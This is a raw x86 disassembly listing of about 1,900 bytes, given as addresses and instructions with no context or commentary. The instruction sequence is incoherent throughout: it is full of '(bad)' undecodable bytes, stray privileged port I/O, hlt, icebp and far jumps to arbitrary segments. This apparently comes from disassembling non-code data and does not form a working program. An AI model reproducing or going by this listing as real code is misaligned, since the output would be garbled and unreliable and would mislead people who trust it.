  41958a:	sub    eax,0xc1751e81
  41958f:	in     al,0x93
  419591:	pop    ss
  419592:	mov    ch,0xb1
  419594:	leave  
  419595:	fimul  DWORD PTR [edx-0x65]
  419598:	popa   
  419599:	sub    al,0x4e
  41959b:	and    eax,0x4cfee9d8
  4195a0:	stos   BYTE PTR es:[edi],al
  4195a1:	xor    eax,0x2e944557
  4195a6:	pop    esp
  4195a7:	cmp    cl,BYTE PTR [ebp+0x46a61a28]
  4195ad:	adc    al,0xc0
  4195af:	fsubr  DWORD PTR [ecx]
  4195b1:	push   ebx
  4195b2:	pop    es
  4195b3:	popf   
  4195b4:	lock sub dh,BYTE PTR [ebp-0xd]
  4195b8:	mov    ds:0xee320604,al
  4195bd:	adc    BYTE PTR [eax],dl
  4195bf:	jne    0x41960a
  4195c1:	int    0x6e
  4195c3:	push   es
  4195c4:	lods   eax,DWORD PTR ds:[esi]
  4195c5:	rcl    DWORD PTR [eax+0x14],1
  4195c8:	cmp    al,0x81
  4195ca:	hlt    
  4195cb:	sub    ebp,ebx
  4195cd:	cmp    BYTE PTR [ecx-0x1ef09c32],bl
  4195d3:	call   0x73b7:0xfd42604b
  4195da:	cmp    al,0xdc
  4195dc:	shl    esi,cl
  4195de:	and    bl,0x49
  4195e1:	shl    eax,1
  4195e3:	ds or  al,0xa4
  4195e6:	xchg   ecx,eax
  4195e7:	cld    
  4195e8:	jg     0x4195ba
  4195ea:	push   ss
  4195eb:	aas    
  4195ec:	xchg   ecx,eax
  4195ed:	inc    eax
  4195ee:	dec    esp
  4195ef:	dec    esp
  4195f0:	mov    cl,0xde
  4195f2:	add    al,bl
  4195f4:	xchg   edi,eax
  4195f5:	or     DWORD PTR [edx-0x6b892aa3],ebp
  4195fb:	mov    cl,0x30
  4195fd:	sub    ebx,DWORD PTR [ecx+0x451347bd]
  419603:	xchg   esi,eax
  419604:	dec    edi
  419605:	daa    
  419606:	sub    eax,DWORD PTR [eax+0x133e276b]
  41960c:	cmp    edi,DWORD PTR [ecx-0x1b]
  41960f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419610:	add    bl,BYTE PTR [ebx-0x3e2cb597]
  419616:	mov    dh,0xaa
  419618:	mov    bl,0x87
  41961a:	dec    esp
  41961b:	push   ds
  41961c:	das    
  41961d:	repz mov al,0xbf
  419620:	add    ecx,DWORD PTR [edi-0x489cdb78]
  419626:	cmp    DWORD PTR ds:0xe0933e45,eax
  41962c:	mov    bl,0x98
  41962e:	xor    ch,bl
  419630:	in     al,0x39
  419632:	rep stos BYTE PTR es:[edi],al
  419634:	mov    al,0x9f
  419636:	lahf   
  419637:	jnp    0x419683
  419639:	jle    0x4196ba
  41963b:	jmp    0x4195db
  41963d:	mov    esp,es
  41963f:	fcmovnb st,st(2)
  419641:	and    BYTE PTR [ebx-0x2aaf4ced],bl
  419647:	pop    ecx
  419648:	test   eax,0x9c2ca396
  41964d:	xchg   DWORD PTR [edx-0xff3b798],edi
  419653:	imul   edx,DWORD PTR [edi+0x6c098609],0xffffff87
  41965a:	test   al,0xbe
  41965c:	lea    ecx,[edx]
  41965e:	jb     0x4196a2
  419660:	sahf   
  419661:	pop    ebp
  419662:	in     eax,dx
  419663:	mov    dh,0x8e
  419665:	leave  
  419666:	gs retf 0x1bec
  41966a:	pop    esp
  41966b:	and    DWORD PTR [edi+0x4d],ebp
  41966e:	mov    WORD PTR [esi-0x417a8061],gs
  419674:	loopne 0x4195f7
  419676:	mov    al,0xc6
  419678:	jmp    0x2fa8:0x898d86f3
  41967f:	or     BYTE PTR [edx-0x3e],ah
  419682:	and    bh,BYTE PTR [edi-0x68b83815]
  419688:	and    ebp,esp
  41968a:	retf   
  41968b:	cmp    DWORD PTR [esi-0x7865975f],edx
  419691:	stos   BYTE PTR es:[edi],al
  419692:	pop    esi
  419693:	cmp    al,0x19
  419695:	cld    
  419696:	gs cmp eax,0x535c9f1
  41969c:	add    ebp,DWORD PTR [ecx]
  41969e:	pusha  
  41969f:	xchg   esi,eax
  4196a0:	daa    
  4196a1:	xor    al,0xdf
  4196a3:	std    
  4196a4:	ss xchg edi,eax
  4196a6:	data16 cli 
  4196a8:	sub    DWORD PTR [edx-0x1a],edi
  4196ab:	fild   DWORD PTR [esi-0x4da84069]
  4196b1:	inc    edi
  4196b2:	popa   
  4196b3:	jmp    DWORD PTR ds:0x16e81ca7
  4196b9:	sbb    ch,cl
  4196bb:	xchg   DWORD PTR [ebx-0x26df959e],edi
  4196c1:	sbb    DWORD PTR [edx+0x684c5f88],edi
  4196c7:	in     al,dx
  4196c8:	adc    DWORD PTR [eax+0x1b],esi
  4196cb:	sbb    DWORD PTR [eax+0x6184a8c],edi
  4196d1:	(bad)  
  4196d2:	jmp    0xe0aea011
  4196d7:	mov    ds:0x71a07af4,eax
  4196dc:	push   es
  4196dd:	pop    ebx
  4196de:	mov    esp,0x8819648c
  4196e3:	test   al,0x4
  4196e5:	mov    edx,0xba641512
  4196ea:	mov    esp,edx
  4196ec:	mov    ch,0x72
  4196ee:	(bad)  
  4196ef:	shl    BYTE PTR [esi+0x5e],1
  4196f2:	fdiv   QWORD PTR [esi+0x69217543]
  4196f8:	iret   
  4196f9:	pop    edx
  4196fa:	imul   eax,DWORD PTR [ecx],0xa
  4196fd:	(bad)  
  4196ff:	aam    0xe5
  419701:	jo     0x4196de
  419703:	mov    BYTE PTR [edx],0x55
  419706:	xchg   si,ax
  419708:	sbb    BYTE PTR [ecx+eiz*8],cl
  41970b:	xor    al,0x85
  41970d:	outs   dx,DWORD PTR ds:[esi]
  41970e:	inc    esi
  41970f:	pop    edx
  419710:	arpl   WORD PTR [edx-0x6b6c81c4],cx
  419716:	sbb    al,0x2
  419718:	icebp  
  419719:	jle    0x419778
  41971b:	div    BYTE PTR es:[eax+eax*8]
  41971f:	cmp    ebx,edx
  419721:	mov    ds:0x6c866d3a,eax
  419726:	push   ebx
  419727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419728:	push   edx
  419729:	pop    ebx
  41972a:	js     0x4196b1
  41972c:	jge    0x41974e
  41972e:	dec    ebp
  41972f:	xor    al,0xcd
  419731:	mov    dh,dl
  419733:	and    al,0x9f
  419735:	mov    dl,0xe3
  419737:	ds (bad) 
  419739:	ror    DWORD PTR [eax],0x94
  41973c:	and    al,0x2f
  41973e:	lds    ebx,FWORD PTR [esi+0x7d612336]
  419744:	ret    
  419745:	inc    ebp
  419746:	add    dh,dh
  419748:	push   ecx
  419749:	mov    gs,WORD PTR [ebx+0x36]
  41974c:	sub    eax,0xd1b1a0aa
  419751:	dec    edi
  419752:	jne    0x41970b
  419754:	jmp    0x41975e
  419756:	or     edx,0xffffff8a
  419759:	js     0x419706
  41975b:	(bad)  
  41975c:	cli    
  41975d:	gs ss jg 0x419723
  419761:	jno    0x419757
  419763:	mov    al,BYTE PTR [eax]
  419765:	mov    ecx,0x5d4ff26
  41976a:	ret    
  41976b:	pusha  
  41976c:	(bad)  
  41976d:	and    dh,BYTE PTR [ebp-0x6a]
  419770:	rcl    DWORD PTR [edi+0x22ddd8e],1
  419776:	or     DWORD PTR [eax],ebx
  419778:	repnz push esp
  41977a:	push   ds
  41977b:	push   ebx
  41977c:	xor    esi,ecx
  41977e:	push   ss
  41977f:	fld    TBYTE PTR [edi+eiz*8-0x3917ea61]
  419786:	popf   
  419787:	jns    0x419798
  419789:	pop    esp
  41978a:	stc    
  41978b:	pop    ecx
  41978c:	mov    dh,0x87
  41978e:	dec    edx
  41978f:	mov    cl,0x2d
  419791:	aaa    
  419792:	or     esi,DWORD PTR [edx+0x28f35140]
  419798:	aam    0x83
  41979a:	fild   WORD PTR [eax-0x767749a7]
  4197a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197a1:	test   DWORD PTR [ebp+0x5b],edi
  4197a4:	jo     0x41981b
  4197a6:	inc    edx
  4197a7:	mov    edi,DWORD PTR [ebp+0x4f5e63c]
  4197ad:	push   ds
  4197ae:	jecxz  0x419772
  4197b0:	cmp    DWORD PTR [ebx+0x42],0xa97f9a79
  4197b7:	mov    edx,DWORD PTR [eax]
  4197b9:	cmp    BYTE PTR [ebx-0x11],bh
  4197bc:	dec    edx
  4197bd:	int    0x84
  4197bf:	enter  0xfd8c,0x5f
  4197c3:	out    dx,al
  4197c4:	stos   BYTE PTR es:[edi],al
  4197c5:	bound  edi,QWORD PTR [ecx+0x45]
  4197c8:	jns    0x41982f
  4197ca:	retf   0x1c42
  4197cd:	mul    DWORD PTR [ebp+ebp*2-0x243b04a1]
  4197d4:	add    eax,0x33bd226a
  4197d9:	cmp    esp,eax
  4197db:	cmc    
  4197dc:	xchg   edi,esi
  4197de:	inc    edi
  4197df:	pop    esi
  4197e0:	mov    dl,0x71
  4197e2:	repz mov dx,0x6ff9
  4197e7:	fs pop edx
  4197e9:	mov    esp,DWORD PTR [esi-0x6]
  4197ec:	adc    DWORD PTR [eax+0x4d],ebp
  4197ef:	out    dx,al
  4197f0:	add    DWORD PTR [edx-0xce5f673],eax
  4197f6:	test   al,0xbb
  4197f8:	or     edi,ecx
  4197fa:	and    eax,0x85e546fb
  4197ff:	inc    edi
  419800:	(bad)  
  419801:	sbb    al,0x99
  419803:	sub    DWORD PTR [esi+0x6f31737c],ebp
  419809:	adc    BYTE PTR [ebp-0x36af223],bh
  41980f:	adc    al,0x9d
  419811:	in     al,0x1b
  419813:	push   eax
  419814:	call   0xae7a:0x3a0c2f4
  41981b:	fidivr WORD PTR [ecx+0x50]
  41981e:	xchg   esp,eax
  41981f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419820:	jno    0x4197b8
  419822:	ret    
  419823:	inc    edx
  419824:	ins    DWORD PTR es:[edi],dx
  419825:	test   al,0x85
  419827:	lahf   
  419828:	call   0x983a6214
  41982d:	fwait
  41982e:	adc    eax,0x79d3ff07
  419833:	fiadd  WORD PTR gs:[ecx-0x4ae45cdb]
  41983a:	and    al,BYTE PTR [ebx]
  41983c:	lock jo 0x419860
  41983f:	enter  0x69ef,0xc2
  419843:	call   0x1e5c:0xbdad157b
  41984a:	repnz push ebx
  41984c:	sub    DWORD PTR [ebp-0x897e22d],ecx
  419852:	xor    DWORD PTR [ebx+0x42adb6d0],edi
  419858:	mov    edx,edi
  41985a:	in     al,0x87
  41985c:	push   ebp
  41985d:	or     edx,DWORD PTR [ebx]
  41985f:	xchg   ebx,eax
  419860:	std    
  419861:	data16 jne 0x419873
  419864:	sub    BYTE PTR ds:0x9a157ff8,ch
  41986a:	push   es
  41986b:	pop    ebx
  41986c:	inc    eax
  41986d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41986e:	or     DWORD PTR [eax+0x42],ebx
  419871:	mov    bl,BYTE PTR [ecx+ebx*8]
  419874:	ficomp DWORD PTR [ecx+edx*4+0x66]
  419878:	inc    ebp
  419879:	push   edx
  41987a:	ins    DWORD PTR es:[edi],dx
  41987b:	or     bh,BYTE PTR [esi-0xa]
  41987e:	clc    
  41987f:	mov    esi,0xb310337c
  419884:	cdq    
  419885:	inc    ebx
  419886:	aam    0x79
  419888:	inc    ebx
  419889:	fist   WORD PTR [ebx+0x4ded126d]
  41988f:	repnz xor ebp,esp
  419892:	add    ebx,edx
  419894:	xchg   DWORD PTR [esi],ebx
  419896:	test   eax,0x5191ec60
  41989b:	fcmovnu st,st(3)
  41989d:	shl    BYTE PTR [ecx+0x59215f78],1
  4198a3:	push   cs
  4198a4:	shl    DWORD PTR [edi-0x2cdbb529],1
  4198aa:	xchg   ecx,eax
  4198ab:	mov    ch,0xab
  4198ad:	outs   dx,DWORD PTR ds:[esi]
  4198ae:	xor    eax,0xc37df011
  4198b3:	mov    eax,0x4f9c1abd
  4198b8:	add    BYTE PTR [ebp-0x1d],0xaa
  4198bc:	or     dh,ch
  4198be:	mov    bh,0xe1
  4198c0:	dec    edi
  4198c1:	jnp    0x419912
  4198c3:	pusha  
  4198c4:	add    al,BYTE PTR [edi]
  4198c6:	add    al,0x4c
  4198c8:	arpl   WORD PTR [edx+0x5a],bp
  4198cb:	mov    ecx,DWORD PTR [ebx]
  4198cd:	jbe    0x419855
  4198cf:	lea    ebx,[ebx+0x60]
  4198d2:	popa   
  4198d3:	sbb    DWORD PTR [ebx+ecx*1],0xffffff9f
  4198d7:	pop    ss
  4198d8:	mov    eax,ds:0x6b6a6
  4198dd:	and    ebp,eax
  4198df:	push   ss
  4198e0:	ins    DWORD PTR es:[edi],dx
  4198e1:	arpl   WORD PTR [esi+0x7e],di
  4198e4:	aaa    
  4198e5:	imul   esi,DWORD PTR [edx-0x77],0xdbeb9531
  4198ec:	test   DWORD PTR ds:0x2c71f47,esi
  4198f2:	jo     0x4198ca
  4198f4:	add    dh,BYTE PTR [esi-0x62]
  4198f7:	or     eax,0x86b2c817
  4198fc:	sar    DWORD PTR [edx+0x3b],1
  4198ff:	retf   0x31db
  419902:	or     BYTE PTR [edx-0x1f],dl
  419905:	jl     0x4198bc
  419907:	lds    edi,FWORD PTR [ecx+ecx*8+0x5e]
  41990b:	mov    WORD PTR [edi+0x36ed96de],es
  419911:	mov    eax,ds:0x9074441b
  419916:	jle    0x41993c
  419918:	daa    
  419919:	int    0x9b
  41991b:	fcom   DWORD PTR [ecx+ebx*1-0x3]
  41991f:	or     bl,BYTE PTR [edi]
  419921:	sbb    eax,0x424488e5
  419926:	imul   eax,DWORD PTR [ecx-0x23],0x6c17c8c5
  41992d:	mov    edi,DWORD PTR [ecx-0x36]
  419930:	shr    eax,cl
  419932:	add    eax,0x256eff92
  419937:	dec    esp
  419938:	lods   al,BYTE PTR ds:[esi]
  419939:	pop    esp
  41993a:	test   eax,0x44b51cce
  41993f:	jns    0x419927
  419941:	je     0x41998c
  419943:	sub    al,0xd2
  419945:	ins    DWORD PTR es:[edi],dx
  419946:	dec    ecx
  419947:	mov    cl,0x48
  419949:	xchg   esi,eax
  41994a:	outs   dx,BYTE PTR ds:[esi]
  41994b:	mov    cl,0xd1
  41994d:	xchg   DWORD PTR [edi+0x4e935b91],edx
  419953:	push   ebp
  419954:	cwde   
  419955:	out    0x20,eax
  419957:	lds    esp,FWORD PTR fs:[esi]
  41995a:	rol    BYTE PTR [ecx],0x13
  41995d:	inc    esi
  41995e:	jp     0x419927
  419960:	cdq    
  419961:	aas    
  419962:	mov    ah,0x8e
  419964:	daa    
  419965:	pop    edi
  419966:	out    0x90,al
  419968:	mov    cl,BYTE PTR [eax+0x3c]
  41996b:	cmp    al,dl
  41996d:	pop    ebx
  41996e:	iret   
  41996f:	inc    edx
  419970:	mov    ecx,0x4f2af0aa
  419975:	and    ecx,0x5fb6d293
  41997b:	and    al,0x39
  41997d:	lods   eax,DWORD PTR ds:[esi]
  41997e:	inc    esp
  41997f:	sbb    edi,eax
  419981:	addr16 lock dec esi
  419984:	in     al,dx
  419985:	and    ecx,DWORD PTR [eax+0x74]
  419988:	sub    dh,ch
  41998a:	and    esp,DWORD PTR [edi]
  41998c:	fld    st(2)
  41998e:	je     0x419924
  419990:	imul   ecx,ecx,0x8dfdd167
  419996:	xchg   edx,eax
  419997:	fcomp  DWORD PTR [edi+0x7f]
  41999a:	sbb    DWORD PTR [edi-0x61ae6d9],0x1afdea3f
  4199a4:	mov    dh,0x56
  4199a6:	adc    DWORD PTR [edi+0x5876d815],esp
  4199ac:	mov    ds:0x23fba9f3,al
  4199b1:	nop
  4199b2:	test   al,0xa8
  4199b4:	jno    0x41994a
  4199b6:	adc    DWORD PTR [ecx+0x71],edx
  4199b9:	xlat   BYTE PTR ds:[ebx]
  4199ba:	mov    bl,0x4d
  4199bc:	cmp    eax,0x8c2d6bee
  4199c1:	pop    ss
  4199c2:	pusha  
  4199c3:	comiss xmm4,DWORD PTR [edi]
  4199c6:	stc    
  4199c7:	pop    ebp
  4199c8:	xchg   edi,eax
  4199c9:	jecxz  0x4199d7
  4199cb:	je     0x419a36
  4199cd:	icebp  
  4199ce:	adc    al,0x8c
  4199d0:	sar    DWORD PTR [edx+ecx*2],cl
  4199d3:	nop
  4199d4:	std    
  4199d5:	push   ecx
  4199d6:	and    DWORD PTR [ecx],ecx
  4199d8:	sub    ecx,eax
  4199da:	pop    edx
  4199db:	push   ebp
  4199dc:	dec    esi
  4199dd:	mov    bl,0xb
  4199df:	or     ch,BYTE PTR ds:0xa6c56057
  4199e5:	push   ds
  4199e6:	in     eax,0x5b
  4199e8:	add    dh,BYTE PTR [esi+0xdef9bb]
  4199ee:	stos   BYTE PTR es:[edi],al
  4199ef:	mov    eax,0x229bb5b8
  4199f4:	xchg   ebx,eax
  4199f5:	ds retf 
  4199f7:	mov    ah,0x7b
  4199f9:	imul   eax,DWORD PTR [ecx-0x4e],0x39
  4199fd:	test   al,0x79
  4199ff:	cs mov dh,0x19
  419a02:	push   ds
  419a03:	cld    
  419a04:	and    edx,DWORD PTR cs:[edi-0x3a]
  419a08:	inc    edx
  419a09:	test   DWORD PTR [edi],edi
  419a0b:	popa   
  419a0c:	aaa    
  419a0d:	mov    ch,0x9e
  419a0f:	cmp    ch,bh
  419a11:	pop    edi
  419a12:	add    al,0x4b
  419a14:	or     bl,al
  419a16:	push   0x6edee5a2
  419a1b:	push   ss
  419a1c:	aaa    
  419a1d:	js     0x4199f1
  419a1f:	mov    ch,0x8
  419a21:	fcmovb st,st(7)
  419a23:	mov    ah,0xaf
  419a25:	pop    esi
  419a26:	mov    eax,0xd11259dc
  419a2b:	aaa    
  419a2c:	ins    DWORD PTR es:[edi],dx
  419a2d:	lahf   
  419a2e:	jmp    0xa674b3b9
  419a33:	xor    DWORD PTR [ecx-0x68],edx
  419a36:	mov    al,ds:0x14aed341
  419a3b:	jg     0x419a82
  419a3d:	push   ebp
  419a3e:	loope  0x419a41
  419a40:	jo     0x419a21
  419a42:	or     dh,BYTE PTR [edi]
  419a44:	fisubr WORD PTR [eax-0x75]
  419a47:	sub    ebx,DWORD PTR [edi]
  419a49:	mov    al,ds:0x7f8b9fc6
  419a4e:	jnp    0x4199f7
  419a50:	gs (bad) 
  419a54:	lea    esp,[edx+0x75]
  419a57:	out    dx,al
  419a58:	repnz rcl ah,cl
  419a5b:	xchg   ebp,eax
  419a5c:	fdiv   QWORD PTR [esp+ebp*4+0x52]
  419a60:	adc    BYTE PTR [ebx-0x7b332c69],dl
  419a66:	out    0x20,eax
  419a68:	test   eax,0xdb0f3c04
  419a6d:	in     al,0xf2
  419a6f:	mov    esi,0x61614512
  419a74:	fisub  WORD PTR [edi+eax*4]
  419a77:	adc    al,0xaa
  419a79:	(bad)  
  419a7b:	jbe    0x419aca
  419a7d:	xchg   edx,eax
  419a7e:	dec    ebx
  419a7f:	stos   DWORD PTR es:[edi],eax
  419a80:	add    al,0x12
  419a82:	data16 aad 0xa4
  419a85:	fmul   st(0),st
  419a87:	mov    bh,0x16
  419a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a8a:	pop    edi
  419a8b:	mov    DWORD PTR [ebx-0x31],edi
  419a8e:	or     DWORD PTR [edi+edi*4-0x730f2d32],esp
  419a95:	jo     0x419a9b
  419a97:	push   ss
  419a98:	test   DWORD PTR [eax-0x64],esi
  419a9b:	cmp    al,0xf3
  419a9d:	mov    al,BYTE PTR [edi+0x1aed74cd]
  419aa3:	pop    ss
  419aa4:	dec    eax
  419aa5:	ror    DWORD PTR [edi+esi*1],cl
  419aa8:	sub    DWORD PTR [esi-0x31],eax
  419aab:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  419aad:	xor    al,0xf8
  419aaf:	adc    al,0xfd
  419ab1:	repnz push edx
  419ab3:	sub    bh,dh
  419ab5:	add    DWORD PTR [ecx+0x6d],eax
  419ab8:	jne    0x419a9e
  419aba:	mov    al,ds:0xa769cb40
  419abf:	fmul   DWORD PTR [ebx]
  419ac1:	sahf   
  419ac2:	mov    dl,0xfa
  419ac4:	retf   0xec99
  419ac7:	imul   ebp,DWORD PTR [edx],0x9b1d0701
  419acd:	dec    ebp
  419ace:	call   DWORD PTR [eax]
  419ad0:	dec    ebp
  419ad1:	xchg   ebx,eax
  419ad2:	mov    eax,ds:0x4173caf2
  419ad7:	add    al,0x8b
  419ad9:	push   eax
  419ada:	sbb    eax,DWORD PTR [esp+eax*1+0x35]
  419ade:	adc    BYTE PTR ds:0xfb345f5f,bl
  419ae4:	and    al,0x4b
  419ae6:	sub    BYTE PTR es:[eax],cl
  419ae9:	mov    ch,0xd
  419aeb:	sbb    BYTE PTR [esp+ebp*2-0x2],ch
  419aef:	scas   eax,DWORD PTR es:[edi]
  419af0:	sbb    cl,BYTE PTR [ebx]
  419af2:	dec    ecx
  419af3:	sub    bh,BYTE PTR [esi]
  419af5:	stos   BYTE PTR es:[edi],al
  419af6:	push   edx
  419af7:	jo     0x419aca
  419af9:	cmc    
  419afa:	in     eax,dx
  419afb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419afc:	mov    ch,0xa5
  419afe:	add    al,0xb7
  419b00:	lds    edx,FWORD PTR [ebp-0x4e]
  419b03:	(bad)  
  419b05:	adc    DWORD PTR [esi],ecx
  419b07:	pop    edi
  419b08:	dec    ecx
  419b09:	test   eax,0xaf85045d
  419b0e:	stos   BYTE PTR es:[edi],al
  419b0f:	dec    ecx
  419b10:	sbb    ch,cl
  419b12:	sub    al,0x28
  419b14:	(bad)  
  419b15:	jne    0x419acd
  419b17:	and    edx,DWORD PTR [esi]
  419b19:	push   es
  419b1a:	xor    al,0xd8
  419b1c:	and    dl,ah
  419b1e:	push   0x21
  419b20:	fst    DWORD PTR [edi+edi*2+0x14904a7c]
  419b27:	push   cs
  419b28:	pop    ds
  419b29:	xor    esi,esp
  419b2b:	mov    bl,0x7
  419b2d:	bound  edx,QWORD PTR [edx]
  419b2f:	(bad)  
  419b30:	xchg   ebp,eax
  419b32:	add    ebx,esp
  419b34:	test   BYTE PTR [ecx+0x1c],0xd6
  419b38:	mov    WORD PTR [ebp-0x53f9529e],gs
  419b3e:	(bad)  
  419b40:	sbb    al,0x60
  419b42:	dec    esp
  419b43:	stos   BYTE PTR es:[edi],al
  419b44:	fcomp  QWORD PTR [ebx+0x52caab62]
  419b4a:	jmp    0x6392e6dd
  419b4f:	cmp    ch,BYTE PTR [ebx]
  419b51:	icebp  
  419b52:	push   ecx
  419b53:	scas   eax,DWORD PTR es:[edi]
  419b54:	sub    al,0x18
  419b56:	or     al,0x70
  419b58:	pop    ebx
  419b59:	lahf   
  419b5a:	mov    esp,0x959db3da
  419b5f:	in     eax,dx
  419b60:	int    0xad
  419b62:	and    al,0x9b
  419b64:	adc    bh,al
  419b66:	retf   0xa204
  419b69:	mov    esi,0x939b20e7
  419b6e:	adc    eax,0x94b5d772
  419b73:	pop    esi
  419b74:	cld    
  419b75:	jns    0x419b50
  419b77:	xor    DWORD PTR ds:0x4ef1d7ea,ecx
  419b7d:	pop    ebp
  419b7e:	inc    esi
  419b7f:	repnz (bad) [ecx+0x4eace5c0]
  419b86:	fs std 
  419b88:	cmp    al,0x17
  419b8a:	cmc    
  419b8b:	addr16 push edi
  419b8d:	push   ss
  419b8e:	pop    ebx
  419b8f:	loop   0x419b7e
  419b91:	outs   dx,BYTE PTR ds:[esi]
  419b92:	popf   
  419b93:	mov    edx,0x665fa837
  419b98:	push   cs
  419b99:	mov    ebx,0x96ba900c
  419b9e:	mov    BYTE PTR [edi-0x4d],bh
  419ba1:	push   ebx
  419ba2:	jb     0x419bf7
  419ba4:	shl    esi,cl
  419ba6:	jecxz  0x419b41
  419ba8:	push   cs
  419ba9:	rol    BYTE PTR [ebx-0x226a58fb],cl
  419baf:	lds    edi,FWORD PTR [ecx-0x61]
  419bb2:	imul   eax,DWORD PTR [ecx],0x34897351
  419bb8:	fcmove st,st(2)
  419bba:	rcr    DWORD PTR [eax+0x8418b8a],cl
  419bc0:	push   cs
  419bc1:	cmp    al,0xe9
  419bc3:	pop    esp
  419bc4:	int3   
  419bc5:	xchg   esp,eax
  419bc6:	and    DWORD PTR [eax+0x4c6b754d],ebp
  419bcc:	sub    BYTE PTR [eax],ch
  419bce:	mov    esi,DWORD PTR [edi+0x28]
  419bd1:	pop    edi
  419bd2:	sahf   
  419bd3:	cs ror ebp,0x1d
  419bd7:	mov    ds:0x12d812b9,al
  419bdc:	inc    ebp
  419bdd:	fcmovne st,st(2)
  419bdf:	cmp    al,0x65
  419be1:	icebp  
  419be2:	and    WORD PTR [edx],si
  419be5:	ss loopne 0x419c4f
  419be8:	add    al,0x15
  419bea:	sbb    al,0x4e
  419bec:	pop    edi
  419bed:	or     ebp,ebp
  419bef:	push   ecx
  419bf0:	repnz mov edi,0xc0c16a0e
  419bf6:	(bad)  
  419bf8:	or     DWORD PTR [eax],0xb4241840
  419bfe:	jae    0x419c09
  419c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c01:	pop    esi
  419c02:	jmp    0x419c28
  419c04:	fcomp  QWORD PTR [esi]
  419c06:	loope  0x419c2e
  419c08:	pop    ebp
  419c09:	dec    esi
  419c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c0b:	lahf   
  419c0c:	push   ecx
  419c0d:	out    dx,al
  419c0e:	das    
  419c0f:	dec    esp
  419c10:	fsubr  QWORD PTR [eax]
  419c12:	inc    edi
  419c13:	and    BYTE PTR [eax],bl
  419c15:	push   esp
  419c16:	retf   0x3114
  419c19:	xchg   ebx,eax
  419c1a:	jecxz  0x419c0b
  419c1c:	lea    edi,[edi]
  419c1e:	lds    ebp,FWORD PTR [ecx]
  419c20:	out    0x56,al
  419c22:	ins    DWORD PTR es:[edi],dx
  419c23:	lock fstp QWORD PTR [eax-0x5b]
  419c27:	int3   
  419c28:	and    eax,0xf100ce8a
  419c2d:	pop    eax
  419c2e:	xchg   al,ah
  419c30:	xor    BYTE PTR [esi-0x61],al
  419c33:	cwde   
  419c34:	dec    edx
  419c35:	xchg   edx,eax
  419c36:	adc    BYTE PTR [edi],dh
  419c38:	cs aas 
  419c3a:	mov    WORD PTR [ebp+0x1b9fc4b4],ds
  419c40:	xchg   edx,eax
  419c41:	mov    esi,DWORD PTR [ecx+ebp*1-0x3e]
  419c45:	mov    al,0x20
  419c47:	ja     0x419c97
  419c49:	xchg   BYTE PTR [edi],al
  419c4b:	ja     0x419c80
  419c4d:	add    eax,0x7f8b28ae
  419c52:	push   ss
  419c53:	and    bl,ah
  419c55:	add    eax,esi
  419c57:	ins    BYTE PTR es:[edi],dx
  419c58:	jb     0x419c3f
  419c5a:	mov    esi,0x2da9aec3
  419c5f:	(bad)  
  419c60:	xlat   BYTE PTR ds:[ebx]
  419c61:	std    
  419c62:	(bad)  
  419c63:	xlat   BYTE PTR ds:[ebx]
  419c64:	ror    BYTE PTR ds:0xbfc08933,0x30
  419c6b:	xchg   ebx,eax
  419c6c:	fidiv  WORD PTR [edi]
  419c6e:	or     BYTE PTR [ebx-0x4f],0xb9
  419c72:	mov    ebp,0xec14c7b7
  419c77:	mov    ds:0xbf99e195,eax
  419c7c:	push   edx
  419c7d:	mov    al,ds:0x70c49da8
  419c82:	pop    esp
  419c83:	jl     0x419c2d
  419c85:	add    ah,bh
  419c87:	and    esi,DWORD PTR [ebx-0x22]
  419c8a:	aas    
  419c8b:	retf   
  419c8c:	or     eax,0x6914a7fb
  419c91:	mov    bh,0xe5
  419c93:	push   ebx
  419c94:	xor    ebp,edx
  419c96:	push   cs
  419c97:	loopne 0x419cc5
  419c99:	hlt    
  419c9a:	fsubr  st(4),st
  419c9c:	sbb    eax,eax
  419c9e:	xor    ah,BYTE PTR [ebx-0x2d]
  419ca1:	jl     0x419cde
  419ca3:	hlt    
  419ca4:	aad    0xeb
  419ca6:	repnz lds edi,FWORD PTR [eax-0x38]
  419caa:	les    esp,FWORD PTR [ebx]
  419cac:	out    0xde,al
  419cae:	sub    ah,BYTE PTR [edi+ebx*4]
  419cb1:	mov    eax,ds:0x6266071b
  419cb6:	cdq    
  419cb7:	mov    ecx,0xab2769b6
  419cbc:	dec    cl
  419cbe:	mov    ds:0x22bf24d,eax
  419cc3:	int    0x3b
  419cc5:	mov    bl,0xae
  419cc7:	lahf   
  419cc8:	jns    0x419d00
  419cca:	rcr    ebx,cl
  419ccc:	jmp    0x50677c7d
  419cd1:	sub    DWORD PTR [ecx+0x19],0x7333c01a
  419cd8:	(bad)  
  419cd9:	and    eax,0xbfcb16d0
  419cde:	dec    edi
  419cdf:	in     al,0xf9
  419ce1:	inc    esp
  419ce2:	out    dx,eax
  419ce3:	mov    eax,ds:0x5fe99e18
  419ce8:	cmp    ch,BYTE PTR [esi+0x4]
  419ceb:	adc    edi,DWORD PTR [ebx+ecx*1+0x76]
  419cef:	sbb    eax,0x9dcd1b4
  419cf4:	arpl   bp,si
  419cf6:	out    dx,eax
  419cf7:	call   0x884b:0xde711fe3
  419cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cff:	xor    eax,0xd30d42e7
  419d04:	and    eax,0xb30346f4
  419d09:	jl     0x419d61
  419d0b:	scas   eax,DWORD PTR es:[edi]
  419d0c:	jne    0x419d33
  419d0e:	sar    ah,0xe1
  419d11:	and    eax,DWORD PTR [eax+0x26]
  419d14:	and    edi,DWORD PTR [edx+0x38f722d4]
  419d1a:	push   eax
  419d1b:	xor    eax,0xa96224c6
  419d20:	xlat   BYTE PTR ds:[ebx]
  419d21:	jb     0x419d15
  419d23:	sti    
  419d24:	fwait
  419d25:	xor    eax,0xe2692ec1
  419d2a:	inc    esi
  419d2b:	out    dx,al
  419d2c:	inc    esi
  419d2d:	aad    0x59
  419d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d30:	popf   
